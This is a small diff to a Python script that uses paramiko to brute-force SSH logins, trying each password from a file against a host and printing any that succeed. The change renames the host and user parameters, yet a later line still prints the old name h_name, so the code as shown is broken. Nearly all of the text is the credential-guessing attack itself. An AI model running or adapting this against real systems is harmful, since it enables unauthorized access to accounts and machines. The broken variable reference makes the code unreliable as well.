@@ -3,7 +3,7 @@ import paramiko
 count = 1
 
 
-def connect_ssh(h_name, port, u_name, pass_file):
+def connect_ssh(hostname, port, username, pass_file):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -14,7 +14,7 @@ def connect_ssh(h_name, port, u_name, pass_file):
             password = password.strip()
 
             try:
-                client.connect(h_name, port=port, username=u_name, password=password)
+                client.connect(hostname, port=port, username=username, password=password)
                 print("[" + str(count) + "] " + "[+] Password Success ~ " + password)
                 print("*" * 50)
                 print("HostName: " + h_name)
